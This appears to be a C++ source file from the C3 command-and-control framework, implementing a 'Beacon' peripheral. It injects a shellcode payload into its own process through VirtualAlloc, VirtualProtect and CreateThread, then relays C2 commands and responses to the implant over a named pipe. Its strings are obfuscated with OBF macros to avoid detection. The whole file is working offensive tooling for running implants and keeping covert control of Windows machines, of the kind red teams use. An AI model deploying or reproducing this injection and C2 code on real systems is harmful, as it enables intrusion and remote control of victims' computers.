#include "StdAfx.h"
#include "Beacon.h"

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::C3::Interfaces::Peripherals::Beacon::Beacon(ByteView arguments)
{
	auto [pipeName, maxConnectionTrials, delayBetweenConnectionTrials, payload] = arguments.Read<std::string, uint16_t, uint16_t, ByteVector>();

	// Arguments validation.
	if (payload.empty())
		throw std::invalid_argument(OBF("There was no payload provided."));

	if (pipeName.empty() || !maxConnectionTrials)
		throw std::invalid_argument(OBF("Cannot establish connection with payload with provided parameters"));

	// Create an R/W region of pages in the virtual address space of current process.
	auto codePointer = static_cast<std::uint8_t*>(VirtualAlloc(0, payload.size(), MEM_COMMIT, PAGE_READWRITE));
	if (!codePointer)
		throw std::runtime_error{ OBF("Couldn't allocate R/W virtual memory: ") + std::to_string(GetLastError()) + OBF(".") };

	// Copy payload to the newly allocated region.
	memcpy_s(codePointer, payload.size(), payload.data(), payload.size());

	DWORD prev;
	//Now mark the memory region R/X
	if (!VirtualProtect(codePointer, payload.size(), PAGE_EXECUTE_READ, &prev))
		throw std::runtime_error(OBF("Couldn't mark virtual memory as R/X. ") + std::to_string(GetLastError()));

	namespace SEH = MWR::WinTools::StructuredExceptionHandling;
	// use explicit type to bypass overload resolution
	DWORD(WINAPI * sehWrapper)(SEH::CodePointer) = SEH::SehWrapper;
	// Inject the payload stage into the current process.
	if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(sehWrapper), codePointer, 0, nullptr))
		throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };

	std::this_thread::sleep_for(std::chrono::milliseconds{ 30 }); // Give beacon thread time to start pipe.

	// Connect to our Beacon named Pipe.
	for (uint16_t connectionTrial = 0u; connectionTrial < maxConnectionTrials; ++connectionTrial)
		try
		{
			m_Pipe = WinTools::AlternatingPipe{ ByteView{ pipeName } };
			return;
		}
		catch (std::exception& e)
		{
			// Sleep between trials.
			Log({ OBF_SEC("Beacon constructor: ") + e.what(), LogMessage::Severity::DebugInformation });
			std::this_thread::sleep_for(std::chrono::milliseconds{ delayBetweenConnectionTrials });
		}

	// Throw a time-out exception.
	throw std::runtime_error{OBF("Beacon creation failed")};
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void MWR::C3::Interfaces::Peripherals::Beacon::OnCommandFromConnector(ByteView data)
{
	// Get access to write when whole reed is done.
	std::unique_lock<std::mutex> lock{ m_Mutex };
	m_ConditionalVariable.wait(lock, [this]() { return !m_ReadingState; });

	// Write
	m_Pipe->Write(data);

	// Unlock, and block writing until read is done.
	m_ReadingState = true;
	lock.unlock();
	m_ConditionalVariable.notify_one();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteVector MWR::C3::Interfaces::Peripherals::Beacon::OnReceiveFromPeripheral()
{
	// Get Access to reed after normal write.
	std::unique_lock<std::mutex> lock{ m_Mutex };
	m_ConditionalVariable.wait(lock, [this]() { return m_ReadingState; });

	// Read
	auto ret = m_Pipe->Read();

	if (IsNoOp(ret))
	{
		// Unlock, and block reading until write is done.
		m_ReadingState = false;
		lock.unlock();
		m_ConditionalVariable.notify_one();
	}
	else
	{
		// Continue in read mode. Send no-op to beacon to get next chunk of data.
		m_Pipe->Write("\0"_bv);
	}

	return  ret;
}

bool MWR::C3::Interfaces::Peripherals::Beacon::IsNoOp(ByteView data)
{
	return data.size() == 1 && data[0] == 0u;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteView MWR::C3::Interfaces::Peripherals::Beacon::GetCapability()
{
	return R"(
{
	"create":
	{
		"arguments":
		[
			{
				"type": "string",
				"name": "Pipe name",
				"min": 4,
				"randomize": true,
				"description": "Name of the pipe Beacon uses for communication."
			},
			{
				"type": "int16",
				"min": 1,
				"defaultValue" : 10,
				"name": "Connection trials",
				"description": "Number of connection trials before marking whole staging process unsuccessful."
			},
			{
				"type": "int16",
				"min": 30,
				"defaultValue" : 1000,
				"name": "Trials delay",
				"description": "Time in milliseconds to wait between unsuccessful connection trails."
			}
		]
	},
	"commands": []
}
)";
}

// Custom payload is removed from release.
//			,
//			{
//				"type": "binary",
//				"name" : "Payload",
//				"description" : "Implant to inject. Leave empty to generate payload."
//			}
